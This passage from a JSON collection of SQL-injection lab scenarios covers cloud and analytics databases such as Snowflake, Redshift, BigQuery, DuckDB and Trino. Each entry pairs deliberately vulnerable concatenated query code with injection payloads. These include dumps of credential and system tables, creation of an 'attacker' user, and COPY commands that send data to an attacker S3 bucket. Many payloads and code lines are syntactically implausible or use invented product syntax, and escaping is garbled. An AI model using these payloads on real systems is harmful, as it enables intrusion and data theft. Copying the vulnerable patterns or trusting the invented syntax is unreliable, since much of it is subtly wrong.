                "srcCode": "spark.sql(\"SELECT * FROM table VERSION AS OF \" + userVersion)",
                "payloads": [
                  "0 UNION SELECT * FROM table@v1--",
                  "(SELECT MAX(version) FROM (DESCRIBE HISTORY table))--"
                ]
              },
              {
                "Lab scenario": "SQL Injection in Amazon Redshift Spectrum External Tables",
                "Lab Description": "A Redshift cluster defines Spectrum external tables with unsanitized input in table properties or location paths. The parameters are concatenated directly into DDL statements, allowing injection when the external tables are queried.",
                "Difficulty Level": "Hard",
                "Solution Steps": [
                  "Identify external table definitions",
                  "Inject through table properties/locations",
                  "Bypass Spectrum validation",
                  "Access unauthorized S3 paths",
                  "Exfiltrate data through external queries"
                ],
                "Vulnerability name": "Redshift Spectrum Injection",
                "srcCode": "CREATE EXTERNAL TABLE ext_sales (LOCATION '\" + userLocation + \"')",
                "payloads": [
                  "s3://legit-bucket/') WITH (FORMAT 'TEXTFILE') UNION SELECT * FROM svv_external_tables--",
                  "s3://attacker-bucket/payload')) FROM (SELECT * FROM pg_user) x--"
                ]
              },
              {
                "Lab scenario": "SQL Injection in Snowflake External Stage COPY Options",
                "Lab Description": "A Snowflake pipeline uses COPY INTO commands with user-controlled stage options. The options are concatenated directly into load/unload operations, allowing injection through crafted file format specifications that modify data loading behavior.",
                "Difficulty Level": "Medium",
                "Solution Steps": [
                  "Identify COPY INTO commands",
                  "Inject through format options",
                  "Bypass stage validation",
                  "Modify loaded data",
                  "Exfiltrate data through file operations"
                ],
                "Vulnerability name": "Snowflake COPY Options Injection",
                "srcCode": "COPY INTO table FROM @stage PATTERN = '.*.csv' FILE_FORMAT = (TYPE = CSV FIELD_OPTIONALLY_ENCLOSED_BY = '\" + userDelim + \"')",
                "payloads": [
                  "' FIELD_DELIMITER=',') FROM (SELECT * FROM information_schema.tables) x--",
                  "\" SKIP_HEADER=1) RETURNING *--"
                ]
              },
              {
                "Lab scenario": "SQL Injection in Google Cloud Spanner DML Returning Clause",
                "Lab Description": "A Spanner application builds DML statements with unsanitized input in RETURNING clauses. The column expressions are concatenated directly into mutation operations, allowing injection that persists after data modification.",
                "Difficulty Level": "Hard",
                "Solution Steps": [
                  "Identify DML RETURNING usage",
                  "Inject through column expressions",
                  "Bypass mutation validation",
                  "Access system tables via subqueries",
                  "Persist malicious logic in transactions"
                ],
                "Vulnerability name": "Spanner DML Returning Injection",
                "srcCode": "UPDATE users SET last_login = CURRENT_TIMESTAMP() WHERE user_id = '\" + userId + \"' THEN RETURN \" + userColumns",
                "payloads": [
                  "* FROM (SELECT * FROM information_schema.tables) x--",
                  "user_id, (SELECT COUNT(*) FROM sensitive_table) AS count--"
                ]
              },
              {
                "Lab scenario": "SQL Injection in Azure Data Explorer KQL Embedded SQL",
                "Lab Description": "A Kusto (KQL) query uses embedded SQL with unsanitized input. The SQL fragments are concatenated directly into KQL execute_sql() functions, allowing injection through crafted SQL that breaks out of the KQL context.",
                "Difficulty Level": "Medium",
                "Solution Steps": [
                  "Identify execute_sql() usage",
                  "Inject through SQL fragments",
                  "Bypass KQL validation",
                  "Access unauthorized clusters",
                  "Exfiltrate data through cross-database queries"
                ],
                "Vulnerability name": "Kusto Embedded SQL Injection",
                "srcCode": "let sql = 'SELECT * FROM openquery('\" + userLink + \"', ''SELECT * FROM table'')'; execute_sql(sql)",
                "payloads": [
                  "legit_link', 'SELECT 1')) UNION SELECT * FROM information_schema.tables--",
                  "attacker_link', 'SELECT * FROM sys.configurations'))--"
                ]
              },
          
              {
                "Lab scenario": "SQL Injection in Apache Druid Native Query SQL Fragments",
                "Lab Description": "A Druid cluster processes native queries containing embedded SQL fragments with unsanitized input. The SQL portions are concatenated directly into query planning, allowing injection that bypasses Druid's usual SQL layer protections.",
                "Difficulty Level": "Medium",
                "Solution Steps": [
                  "Identify native query endpoints",
                  "Inject through SQL fragments",
                  "Bypass query planning validation",
                  "Access system metadata",
                  "Execute native Druid queries"
                ],
                "Vulnerability name": "Druid Native Query Injection",
                "srcCode": "{\"query\":\"{\\\"queryType\\\":\\\"sql\\\",\\\"sql\\\":\\\"SELECT * FROM datasource WHERE \" + userCondition + \"\\\"}\"}",
                "payloads": [
                  "1=1 UNION SELECT * FROM sys.segments--",
                  "__time > 0) FROM (SELECT * FROM druid_segments) x--"
                ]
              },
              {
                "Lab scenario": "SQL Injection in InfluxDB Flux to SQL Conversion",
                "Lab Description": "A monitoring system converts InfluxDB Flux queries to SQL with unsanitized input in filter expressions. The Flux predicates are concatenated directly into SQL WHERE clauses, allowing injection through crafted filter logic.",
                "Difficulty Level": "Hard",
                "Solution Steps": [
                  "Identify Flux to SQL conversion",
                  "Inject through filter() parameters",
                  "Bypass Flux syntax validation",
                  "Execute arbitrary SQL",
                  "Exfiltrate metrics data"
                ],
                "Vulnerability name": "Flux-to-SQL Injection",
                "srcCode": "from(bucket:\"metrics\") |> filter(fn: (r) => r._field == '\" + userField + \"') |> toSQL()",
                "payloads": [
                  "value' OR r._measurement == 'secret_metrics'--",
                  "cpu' FROM (SELECT * FROM sql_metrics) x--"
                ]
              },
              {
                "Lab scenario": "SQL Injection in TimescaleDB Continuous Aggregates Materialization",
                "Lab Description": "A time-series platform creates TimescaleDB continuous aggregates with user-provided refresh policies. The policy parameters are concatenated directly into materialization queries, allowing injection during automated refreshes.",
                "Difficulty Level": "Hard",
                "Solution Steps": [
                  "Identify continuous aggregates",
                  "Inject through refresh parameters",
                  "Trigger materialization jobs",
                  "Bypass time bucket validation",
                  "Compromise hypertable data"
                ],
                "Vulnerability name": "Timescale Materialization Injection",
                "srcCode": "CREATE MATERIALIZED VIEW metrics_agg WITH (timescaledb.continuous) AS SELECT time_bucket('\" + userInterval + \"', time) FROM metrics",
                "payloads": [
                  "1 hour') FROM (SELECT * FROM _timescaledb_catalog.hypertable)--",
                  "interval '1 day') WHERE 1=0) UNION SELECT * FROM chunks--"
                ]
              },
              {
                "Lab scenario": "SQL Injection in CockroachDB Change Data Capture Filters",
                "Lab Description": "A CockroachDB changefeed uses user-provided filters that are concatenated directly into CDC queries. The filters allow injection that persists across change events, compromising all captured data.",
                "Difficulty Level": "Medium",
                "Solution Steps": [
                  "Identify changefeed creation",
                  "Inject through filter expressions",
                  "Trigger data changes",
                  "Bypass CDC validation",
                  "Exfiltrate data via webhooks"
                ],
                "Vulnerability name": "CockroachCDC Filter Injection",
                "srcCode": "CREATE CHANGEFEED FOR TABLE users WITH filter = '\" + userFilter + \"'",
                "payloads": [
                  "SELECT * FROM users WHERE type = 'admin'--",
                  "SELECT *, (SELECT version()) FROM users--"
                ]
              },
              {
                "Lab scenario": "SQL Injection in DuckDB HTTPFS Extension Headers",
                "Lab Description": "A data pipeline uses DuckDB's HTTPFS extension with user-provided HTTP headers. The headers are concatenated directly into remote requests, allowing injection when accessing cloud storage.",
                "Difficulty Level": "Hard",
                "Solution Steps": [
                  "Identify HTTPFS usage",
                  "Inject through header parameters",
                  "Bypass request validation",
                  "Modify remote data access",
                  "Exfiltrate credentials"
                ],
                "Vulnerability name": "DuckDB HTTP Header Injection",
                "srcCode": "SET s3_region='\" + userRegion + \"'; SET s3_access_key_id='\" + userKey + \"'; SET s3_secret_access_key='\" + userSecret + \"'",
                "payloads": [
                  "us-east-1'); COPY (SELECT * FROM sqlite_master) TO 's3://attacker-bucket/leak'--",
                  "legit-region', s3_access_key_id='x', s3_secret_access_key='y') FROM (SELECT * FROM duckdb_settings)--"
                ]
              },
              {
                "Lab scenario": "SQL Injection in Materialized View Index Predicates",
                "Lab Description": "A database creates materialized view indexes with user-provided predicate expressions. The predicates are concatenated directly into index creation, allowing persistent injection that affects all queries using the index.",
                "Difficulty Level": "Hard",
                "Solution Steps": [
                  "Identify indexed view creation",
                  "Inject through predicate expressions",
                  "Trigger index usage",
                  "Bypass predicate validation",
                  "Persist malicious logic in schema"
                ],
                "Vulnerability name": "Materialized View Index Injection",
                "srcCode": "CREATE INDEX idx_filtered ON materialized_view (column) WHERE '\" + userPredicate + \"'",
                "payloads": [
                  "1=1) WITH (FILLFACTOR=100) UNION SELECT * FROM pg_indexes--",
                  "column IS NOT NULL) FROM (SELECT * FROM pg_matviews) x--"
                ]
              },
              {
                "Lab scenario": "SQL Injection in SQL Server PolyBase External Table Locations",
                "Lab Description": "A SQL Server instance creates PolyBase external tables with user-provided location paths. The paths are concatenated directly into DDL statements, allowing injection when querying external data.",
                "Difficulty Level": "Medium",
                "Solution Steps": [
                  "Identify external table creation",
                  "Inject through location parameters",
                  "Bypass PolyBase validation",
                  "Access unauthorized storage",
                  "Execute remote commands"
                ],
                "Vulnerability name": "PolyBase Location Injection",
                "srcCode": "CREATE EXTERNAL TABLE ext_data (LOCATION = '\" + userLocation + \"')",
                "payloads": [
                  "/data/files') FROM (SELECT * FROM sys.sql_logins) x--",
                  "C:\\import\\data.csv'); CREATE USER attacker WITH PASSWORD 'hack'--"
                ]
              },
              {
                "Lab scenario": "SQL Injection in Google BigQuery Remote Function Responses",
                "Lab Description": "A BigQuery implementation calls remote functions where the HTTP response is interpolated directly into SQL. Malicious function responses can inject SQL that bypasses BigQuery's normal parameterization.",
                "Difficulty Level": "Hard",
                "Solution Steps": [
                  "Identify remote function calls",
                  "Craft malicious HTTP responses",
                  "Bypass response validation",
                  "Execute arbitrary SQL",
                  "Access cross-project datasets"
                ],
                "Vulnerability name": "BigQuery Remote Function Injection",
                "srcCode": "CREATE FUNCTION remote_process(arg STRING) RETURNS STRING REMOTE WITH CONNECTION remote_conn OPTIONS (endpoint = 'https://api.example.com/process?param=' || arg)",
                "payloads": [
                  "1' UNION SELECT dataset_id FROM region-us.INFORMATION_SCHEMA.SCHEMATA--",
                  "legit' FROM (SELECT * FROM EXTERNAL_QUERY('connection', 'SELECT 1'))--"
                ]
              },
              {
                "Lab scenario": "SQL Injection in Snowflake External Function Response Headers",
                "Lab Description": "A Snowflake external function processes HTTP response headers as SQL values. Malicious headers can inject SQL that persists during the entire function execution context.",
                "Difficulty Level": "Medium",
                "Solution Steps": [
                  "Identify external functions",
                  "Inject through response headers",
                  "Bypass header validation",
                  "Execute stacked queries",
                  "Persist payloads in session"
                ],
                "Vulnerability name": "Snowflake Function Header Injection",
                "srcCode": "CREATE EXTERNAL FUNCTION api_call(param STRING) RETURNS STRING HEADERS = {'result-sql': '\" + userHeader + \"'} API_INTEGRATION = api_int AS 'https://api.example.com'",
                "payloads": [
                  "' FROM (SELECT * FROM information_schema.tables)--",
                  "1'); SELECT system$whitelist()--"
                ]
              },
              {
                "Lab scenario": "SQL Injection in Databricks Unity Catalog Table Properties",
                "Lab Description": "A Databricks environment sets Unity Catalog table properties with user-provided values. The properties are concatenated directly into catalog metadata queries, allowing injection during table operations.",
                "Difficulty Level": "Hard",
                "Solution Steps": [
                  "Identify table property settings",
                  "Inject through property values",
                  "Trigger catalog queries",
                  "Bypass Unity Catalog validation",
                  "Access metastore data"
                ],
                "Vulnerability name": "Unity Catalog Property Injection",
                "srcCode": "ALTER TABLE db.table SET TBLPROPERTIES ('\" + userKey + \"' = '\" + userValue + \"')",
                "payloads": [
                  "owner' = 'admin') FROM (SELECT * FROM system.information_schema.tables)--",
                  "comment' = 'test'); SELECT * FROM system.information_schema.columns--"
                ]
              },
              {
                "Lab scenario": "SQL Injection in Trino System Access Control Rules",
                "Lab Description": "A Trino cluster defines system access control rules with user-provided conditions. The conditions are concatenated directly into authorization queries, allowing injection during permission checks.",
                "Difficulty Level": "Hard",
                "Solution Steps": [
                  "Identify access control endpoints",
                  "Inject through rule conditions",
                  "Trigger authorization checks",
                  "Bypass security validation",
                  "Elevate privileges"
                ],
                "Vulnerability name": "Trino Authorization Injection",
                "srcCode": "CREATE AUTHORIZATION rule_name ON SCHEMA schema_name TO USER user_name WITH CONDITION '\" + userCondition + \"'",
                "payloads": [
                  "1=1) OR (SELECT 1 FROM system.metadata.catalogs)--",
                  "user_name = current_user()); INSERT INTO system.runtime.roles VALUES ('admin')--"
                ]
              },
              {
                "Lab scenario": "SQL Injection in Presto Resource Group Selectors",
                "Lab Description": "A Presto cluster configures resource group selectors with user-provided expressions. The expressions are concatenated directly into resource allocation queries, allowing injection during query scheduling.",
                "Difficulty Level": "Medium",
                "Solution Steps": [
                  "Identify resource group configuration",
                  "Inject through selector expressions",
                  "Trigger query scheduling",
                  "Bypass selector validation",
                  "Modify resource allocation"
                ],
                "Vulnerability name": "Presto Resource Group Injection",
                "srcCode": "CREATE RESOURCE GROUP group_name WITH (soft_memory_limit='80%', selector='\" + userSelector + \"')",
                "payloads": [
                  "true) FROM (SELECT * FROM system.metadata.catalogs) x--",
                  "user='admin' OR 1=1)--"
                ]
              },
              {
                "Lab scenario": "SQL Injection in ClickHouse User-Defined Function SQL",
                "Lab Description": "A ClickHouse cluster creates SQL UDFs with user-provided function bodies. The SQL is concatenated directly into function creation, allowing persistent injection that affects all queries using the function.",
                "Difficulty Level": "Hard",
                "Solution Steps": [
                  "Identify UDF creation endpoints",
                  "Inject through function SQL",
                  "Trigger function execution",
                  "Bypass UDF validation",
                  "Persist malicious logic"
                ],
                "Vulnerability name": "ClickHouse UDF Injection",
                "srcCode": "CREATE FUNCTION custom_filter AS (x) -> '\" + userSql + \"'",
                "payloads": [
                  "x OR (SELECT * FROM system.processes)--",
                  "1=1) FROM (SELECT * FROM system.functions)--"
                ]
              },



              
                  {
                    "Lab scenario": "SQL Injection in PostgreSQL Range Type Constructor",
                    "Lab Description": "A scheduling application builds PostgreSQL range queries (tsrange, numrange) with unsanitized user input. Attackers can break out of the range context through specially crafted boundary expressions that evaluate to SQL commands.",
                    "Difficulty Level": "Hard",
                    "Solution Steps": [
                      "Identify range type usage in queries",
                      "Craft malicious range bounds containing SQL",
                      "Bypass range validation with infinity markers",
                      "Execute commands through range constructor functions",
                      "Exfiltrate data via range error messages"
                    ],
                    "Vulnerability name": "PostgreSQL Range Injection",
                    "srcCode": "SELECT * FROM events WHERE period = tsrange('\" + startTime + \"', '\" + endTime + \"')",
                    "payloads": [
                      "2023-01-01', '2023-12-31'::text) FROM (SELECT * FROM pg_user)--",
                      "now()', infinity'::text) WHERE 1=0 UNION SELECT 1,2,3--"
                    ]
                  },
                  {
                    "Lab scenario": "SQL Injection in MySQL Spatial Reference System Parameters",
                    "Lab Description": "A GIS system builds MySQL spatial queries with dynamic SRID (Spatial Reference System Identifier) parameters. The numeric SRID values are concatenated directly into ST_Transform calls, allowing injection through mathematical expressions.",
                    "Difficulty Level": "Medium",
                    "Solution Steps": [
                      "Identify ST_Transform function usage",
                      "Inject through SRID parameter expressions",
                      "Bypass numeric validation with arithmetic",
                      "Access system tables via spatial function errors",
                      "Pivot attack through geometry tables"
                    ],
                    "Vulnerability name": "MySQL SRID Injection",
                    "srcCode": "SELECT ST_AsText(ST_Transform(geom, \" + userSrid + \")) FROM parcels",
                    "payloads": [
                      "4326) FROM (SELECT * FROM mysql.user) x--",
                      "0+(SELECT COUNT(*) FROM information_schema.tables))--"
                    ]
                  },
                  {
                    "Lab scenario": "SQL Injection in SQL Server Temporal Table AS OF Clause",
                    "Lab Description": "A historical data application uses SQL Server temporal tables with dynamic AS OF timestamps. The timestamp strings are concatenated directly into temporal queries, allowing injection through crafted date literals.",
                    "Difficulty Level": "Hard",
                    "Solution Steps": [
                      "Identify temporal query endpoints",
                      "Inject through AS OF timestamp parameter",
                      "Bypass date format validation",
                      "Access historical versions of sensitive tables",
                      "Recover deleted records via versioning"
                    ],
                    "Vulnerability name": "SQL Server Temporal Injection",
                    "srcCode": "SELECT * FROM Employees FOR SYSTEM_TIME AS OF '\" + userTimestamp + \"'",
                    "payloads": [
                      "2023-01-01 00:00:00') FROM (SELECT * FROM sys.objects) x--",
                      "GETDATE()') WHERE 1=0 UNION SELECT * FROM history.Employees--"
                    ]
                  },
                  {
                    "Lab scenario": "SQL Injection in Oracle Text INDEX PARAMETERS",
                    "Lab Description": "A document search system creates Oracle Text indexes with dynamic parameters. The parameter strings are concatenated into index DDL, allowing persistent injection that affects all queries using the index.",
                    "Difficulty Level": "Hard",
                    "Solution Steps": [
                      "Identify index creation endpoints",
                      "Inject through PARAMETERS clause",
                      "Trigger index maintenance operations",
                      "Bypass CTXSYS privilege checks",
                      "Persist malicious logic in index metadata"
                    ],
                    "Vulnerability name": "Oracle Text Index Injection",
                    "srcCode": "CREATE INDEX doc_idx ON documents(text_column) INDEXTYPE IS CTXSYS.CONTEXT PARAMETERS('\\'' + userParams + '\\'')",
                    "payloads": [
                      "SYNC (ON COMMIT)') FROM (SELECT * FROM all_indexes) x--",
                      "FILTER CTXSYS.NULL_FILTER SECTION GROUP CTXSYS.HTML_SECTION_GROUP') WHERE 1=0 UNION SELECT 1 FROM dual--"
                    ]
                  },
                  {
                    "Lab scenario": "SQL Injection in Snowflake Tag-Based Masking Policies",
                    "Lab Description": "A Snowflake data governance system creates tag-based masking policies with dynamic conditions. The policy expressions are concatenated directly into CREATE MASKING POLICY statements, allowing injection through crafted tag values.",
                    "Difficulty Level": "Hard",
                    "Solution Steps": [
                      "Identify masking policy creation",
                      "Inject through policy condition parameters",
                      "Trigger policy evaluation on sensitive data",
                      "Bypass tag value validation",
                      "Access unmasked data through policy flaws"
                    ],
                    "Vulnerability name": "Snowflake Tag Policy Injection",
                    "srcCode": "CREATE MASKING POLICY mask_ssn AS (val STRING) RETURNS STRING -> CASE WHEN '\\'' + userCondition + '\\'' THEN '***' ELSE val END",
                    "payloads": [
                      "1=1 THEN (SELECT current_role()) ELSE NULL END--",
                      "EXISTS(SELECT * FROM information_schema.tables) THEN val ELSE NULL END--"
                    ]
                  },
                  {
                    "Lab scenario": "SQL Injection in Google BigQuery ARRAY_AGG Order By Clause",
                    "Lab Description": "A analytics dashboard builds BigQuery ARRAY_AGG functions with dynamic ORDER BY clauses. The sort expressions are concatenated directly into array aggregation, allowing injection through crafted ordering specifications.",
                    "Difficulty Level": "Medium",
                    "Solution Steps": [
                      "Identify ARRAY_AGG usage in queries",
                      "Inject through ORDER BY expressions",
                      "Bypass array function constraints",
                      "Access project metadata via sort errors",
                      "Exfiltrate data through array elements"
                    ],
                    "Vulnerability name": "BigQuery ARRAY_AGG Injection",
                    "srcCode": "SELECT ARRAY_AGG(name ORDER BY '\\'' + userSort + '\\'' DESC) FROM users",
                    "payloads": [
                      "1) FROM (SELECT * FROM `region-us`.INFORMATION_SCHEMA.SCHEMATA) x--",
                      "(SELECT COUNT(*) FROM sensitive_table)) OVER()--"
                    ]
                  },
                  {
                    "Lab scenario": "SQL Injection in Azure Synapse CETAS External File Paths",
                    "Lab Description": "A Synapse pipeline uses CETAS (CREATE EXTERNAL TABLE AS SELECT) with dynamic output paths. The file locations are concatenated directly into DDL, allowing injection through crafted storage paths.",
                    "Difficulty Level": "Hard",
                    "Solution Steps": [
                      "Identify CETAS statement usage",
                      "Inject through external file location",
                      "Bypass storage account validation",
                      "Modify exported data contents",
                      "Exfiltrate data via path manipulation"
                    ],
                    "Vulnerability name": "Synapse CETAS Path Injection",
                    "srcCode": "CREATE EXTERNAL TABLE ext_data WITH (LOCATION = '\\'' + userPath + '\\'') AS SELECT * FROM source",
                    "payloads": [
                      "wasbs://container@storage.blob.core.windows.net/path') WITH (FORMAT='PARQUET') UNION SELECT * FROM sys.sql_logins--",
                      "/tmp/legit') FROM (SELECT * FROM sys.dm_pdw_exec_requests) x--"
                    ]
                  },
                  {
                    "Lab scenario": "SQL Injection in Databricks Delta Lake VACUUM Retention",
                    "Lab Description": "A Databricks job runs Delta Lake VACUUM commands with dynamic retention periods. The duration strings are concatenated directly into vacuum operations, allowing injection through crafted time expressions.",
                    "Difficulty Level": "Medium",
                    "Solution Steps": [
                      "Identify VACUUM command usage",
                      "Inject through retention parameter",
                      "Bypass duration validation",
                      "Access historical data versions",
                      "Recover deleted records via vacuum flaws"
                    ],
                    "Vulnerability name": "Delta Lake VACUUM Injection",
                    "srcCode": "spark.sql(\\\"VACUUM delta.`/path/to/table` RETAIN '\\\\\\\" + userHours + \\\\\\\"' HOURS\\\")",
                    "payloads": [
                      "0 HOURS') FROM (DESCRIBE HISTORY delta.`/path/to/table`)--",
                      "168 HOURS' WITH SCHEMA (SELECT * FROM .`/path/to/sensitive_table`)--"
                    ]
                  },
                  {
                    "Lab scenario": "SQL Injection in Amazon Redshift SUPER Type Path Queries",
                    "Lab Description": "A Redshift application queries SUPER type columns with dynamic path expressions. The JSON paths are concatenated directly into queries, allowing injection through crafted path syntax.",
                    "Difficulty Level": "Hard",
                    "Solution Steps": [
                      "Identify SUPER type query endpoints",
                      "Inject through JSON path parameters",
                      "Bypass path validation with unnesting",
                      "Access system tables via path errors",
                      "Exfiltrate data through nested queries"
                    ],
                    "Vulnerability name": "Redshift SUPER Path Injection",
                    "srcCode": "SELECT json_extract_path_text(json_column, '\\\"' + userPath + '\\\"') FROM semi_structured_data",
                    "payloads": [
                      "key') FROM (SELECT * FROM svv_external_tables) x--",
                      "array[0]') WHERE 1=0 UNION SELECT 1,2,3--"
                    ]
                  },
                  {
                    "Lab scenario": "SQL Injection in Snowflake External Table Refresh",
                    "Lab Description": "A Snowflake pipeline refreshes external tables with dynamic parameters. The refresh options are concatenated directly into ALTER EXTERNAL TABLE statements, allowing injection during metadata updates.",
                    "Difficulty Level": "Medium",
                    "Solution Steps": [
                      "Identify external table refresh points",
                      "Inject through refresh parameters",
                      "Trigger metadata reload",
                      "Bypass file format validation",
                      "Modify table schema definitions"
                    ],
                    "Vulnerability name": "Snowflake External Table Refresh Injection",
                    "srcCode": "ALTER EXTERNAL TABLE ext_tbl REFRESH '\\\\\" + userOptions + \\\\\"'",
                    "payloads": [
                      "') FROM (SELECT * FROM information_schema.tables) x--",
                      "PATTERN='.*.csv') RETURNING *--"
                    ]
                  },
                  {
                    "Lab scenario": "SQL Injection in Google Cloud Spanner INTERLEAVE IN PARENT",
                    "Lab Description": "A Spanner schema migration tool builds INTERLEAVE IN PARENT clauses with dynamic table names. The parent references are concatenated directly into DDL, allowing injection during table creation.",
                    "Difficulty Level": "Hard",
                    "Solution Steps": [
                      "Identify interleaved table creation",
                      "Inject through parent table parameter",
                      "Bypass schema validation checks",
                      "Access unauthorized datasets",
                      "Modify table inheritance relationships"
                    ],
                    "Vulnerability name": "Spanner Interleave Injection",
                    "srcCode": "CREATE TABLE child_table INTERLEAVE IN PARENT '\\\\\" + userParent + \\\\\"'",
                    "payloads": [
                      "legit_parent')--SPANNER.IGNORE_INTERLEAVE=1 SELECT * FROM information_schema.tables--",
                      "table1' WHERE 1=0) OR 1=1--"
                    ]
                  },
                  {
                    "Lab scenario": "SQL Injection in Azure Data Explorer External Table Schema",
                    "Lab Description": "A Kusto cluster creates external tables with dynamic schema definitions. The schema expressions are concatenated directly into .create external table commands, allowing injection during schema inference.",
                    "Difficulty Level": "Medium",
                    "Solution Steps": [
                      "Identify external table creation",
                      "Inject through schema parameter",
                      "Trigger schema inference",
                      "Bypass type validation",
                      "Modify query results via schema poisoning"
                    ],
                    "Vulnerability name": "Kusto External Schema Injection",
                    "srcCode": ".create external table ext_tbl ('\\\\\" + userSchema + \\\\\"')",
                    "payloads": [
                      "col1:string) FROM (SELECT * FROM .show tables) x--",
                      "col1:dynamic) WITH (FORMAT='JSON') WHERE 1=0 UNION SELECT 1--"
                    ]
                  },
                  {
                    "Lab scenario": "SQL Injection in Elasticsearch SQL ODBC Driver Connection Strings",
                    "Lab Description": "An application builds Elasticsearch ODBC connection strings with dynamic properties. The property values are concatenated directly into connection attempts, allowing injection during driver initialization.",
                    "Difficulty Level": "Hard",
                    "Solution Steps": [
                      "Identify ODBC connection points",
                      "Inject through connection properties",
                      "Bypass driver validation",
                      "Access restricted indices",
                      "Exfiltrate data through driver errors"
                    ],
                    "Vulnerability name": "Elasticsearch ODBC Connection Injection",
                    "srcCode": "Driver={Elasticsearch ODBC};Server=\" + userServer + \";UID=\" + userUid + \";PWD=\" + userPwd",
                    "payloads": [
                      "attacker.com;Properties=security=\\\\\\\" + (SELECT * FROM information_schema.tables) + \\\\\\\"--",
                      "legit.com:9200\\\\\\\";UID=admin\\\\\\\";PWD=' OR 1=1--"
                    ]
                  },
                  {
                    "Lab scenario": "SQL Injection in Apache Druid SQL Identifier Escaping",
                    "Lab Description": "A Druid cluster processes SQL queries with dynamic identifier escaping. The escape sequences are concatenated directly into query planning, allowing injection through crafted identifier patterns.",
                    "Difficulty Level": "Medium",
                    "Solution Steps": [
                      "Identify dynamic identifier usage",
                      "Inject through escape sequences",
                      "Bypass SQL parser validation",
                      "Access system metadata tables",
                      "Execute native Druid queries"
                    ],
                    "Vulnerability name": "Druid Identifier Escape Injection",
                    "srcCode": "SELECT * FROM \\\"\" + userTable + \"\\\"",
                    "payloads": [
                      "datasource\\\" FROM (SELECT * FROM sys.segments) x--",
                      "legit_table\\\" WHERE __time > 0) UNION SELECT 1,2,3--"
                    ]
                  },
                  {
                    "Lab scenario": "SQL Injection in InfluxDB Flux Yield Parameter",
                    "Lab Description": "A monitoring system uses InfluxDB Flux with dynamic yield names. The yield identifiers are concatenated directly into Flux scripts, allowing injection during result processing.",
                    "Difficulty Level": "Hard",
                    "Solution Steps": [
                      "Identify yield statement usage",
                      "Inject through yield name parameter",
                      "Bypass Flux parser validation",
                      "Modify query results",
                      "Exfiltrate data through yielded output"
                    ],
                    "Vulnerability name": "Flux Yield Injection",
                    "srcCode": "from(bucket:\"metrics\") |> yield(name: \"\" + userYield + \"\")",
                    "payloads": [
                      "result\\\" FROM (SELECT * FROM sql_metrics) x--",
                      "data\\\" WHERE 1=0) UNION SELECT 1--"
                    ]
                  },
                  {
                    "Lab scenario": "SQL Injection in TimescaleDB Compression Settings",
                    "Lab Description": "A time-series platform alters TimescaleDB compression with dynamic parameters. The configuration strings are concatenated directly into ALTER TABLE statements, allowing injection during compression operations.",
                    "Difficulty Level": "Medium",
                    "Solution Steps": [
                      "Identify compression configuration",
                      "Inject through compression parameters",
                      "Trigger compression jobs",
                      "Bypass settings validation",
                      "Access compressed chunk data"
                    ],
                    "Vulnerability name": "Timescale Compression Injection",
                    "srcCode": "ALTER TABLE metrics SET (timescaledb.compress, timescaledb.compress_orderby = \\\\\" + userOrder + \\\\\"')",
                    "payloads": [
                      "time DESC') FROM (SELECT * FROM _timescaledb_catalog.hypertable)--",
                      "col1,col2) WHERE 1=0 UNION SELECT 1,2,3--"
                    ]
                  },
                  {
                    "Lab scenario": "SQL Injection in CockroachDB Partial Index Predicates",
                    "Lab Description": "A CockroachDB application creates partial indexes with dynamic WHERE clauses. The predicates are concatenated directly into index creation, allowing persistent injection that affects all queries using the index.",
                    "Difficulty Level": "Hard",
                    "Solution Steps": [
                      "Identify partial index creation",
                      "Inject through index predicate",
                      "Trigger index usage",
                      "Bypass predicate validation",
                      "Persist malicious logic in schema"
                    ],
                    "Vulnerability name": "Cockroach Partial Index Injection",
                    "srcCode": "CREATE INDEX idx_filtered ON users (email) WHERE \\\\\" + userCondition + \\\\\"'",
                    "payloads": [
                      "1=1) WITH (STORING = (password))--",
                      "is_active) FROM (SELECT * FROM crdb_internal.tables) x--"
                    ]
                  },
                  {
                    "Lab scenario": "SQL Injection in DuckDB S3 Endpoint Configuration",
                    "Lab Description": "A data pipeline configures DuckDB's S3 extension with dynamic endpoints. The connection strings are concatenated directly into S3 settings, allowing injection during cloud storage operations.",
                    "Difficulty Level": "Medium",
                    "Solution Steps": [
                      "Identify S3 configuration points",
                      "Inject through endpoint parameters",
                      "Bypass URL validation",
                      "Modify remote data access",
                      "Exfiltrate credentials"
                    ],
                    "Vulnerability name": "DuckDB S3 Endpoint Injection",
                    "srcCode": "SET s3_endpoint='\" + userEndpoint + \"'; SET s3_access_key_id='\" + userKey + \"'; SET s3_secret_access_key='\" + userSecret + \"'",
                    "payloads": [
                      "attacker.com') FROM (SELECT * FROM duckdb_settings)--",
                      "legit.s3.amazonaws.com'; COPY (SELECT * FROM sqlite_master) TO 's3://exfil/leak'--"
                    ]
                  },
                  {
                    "Lab scenario": "SQL Injection in Materialized View WITH NO DATA Clause",
                    "Lab Description": "A database creates materialized views with dynamic WITH NO DATA options. The clause expressions are concatenated directly into view creation, allowing injection during initial population.",
                    "Difficulty Level": "Hard",
                    "Solution Steps": [
                      "Identify materialized view creation",
                      "Inject through WITH NO DATA clause",
                      "Trigger view population",
                      "Bypass data validation",
                      "Modify view contents"
                    ],
                    "Vulnerability name": "Materialized View Data Clause Injection",
                    "srcCode": "CREATE MATERIALIZED VIEW mv AS SELECT * FROM source WITH \\\\\" + userDataOption + \\\\\"'",
                    "payloads": [
                      "NO DATA) FROM (SELECT * FROM pg_matviews) x--",
                      "DATA) WHERE 1=0 UNION SELECT 1,2,3--"
                    ]
                  },
                  {
                    "Lab scenario": "SQL Injection in SQL Server Ledger View Options",
                    "Lab Description": "A blockchain application uses SQL Server Ledger with dynamic view parameters. The options are concatenated directly into ledger view creation, allowing injection during cryptographic verification.",
                    "Difficulty Level": "Hard",
                    "Solution Steps": [
                      "Identify ledger view creation",
                      "Inject through view options",
                      "Trigger ledger verification",
                      "Bypass blockchain validation",
                      "Modify historical records"
                    ],
                    "Vulnerability name": "SQL Ledger View Injection",
                    "srcCode": "CREATE VIEW ledger_view WITH (LEDGER_VIEW = ON, '\\\\\" + userOptions + \\\\\"') AS SELECT * FROM table",
                    "payloads": [
                      "VERIFICATION = ON) FROM (SELECT * FROM sys.database_principals) x--",
                      "TRANSACTION_ID_COLUMN = id) WHERE 1=0 UNION SELECT 1--"
                    ]
                  },
                  {
                    "Lab scenario": "SQL Injection in Google BigQuery Wildcard Table Patterns",
                    "Lab Description": "A data analytics tool uses BigQuery wildcard tables with dynamic patterns. The table patterns are concatenated directly into FROM clauses, allowing injection through crafted glob expressions.",
                    "Difficulty Level": "Medium",
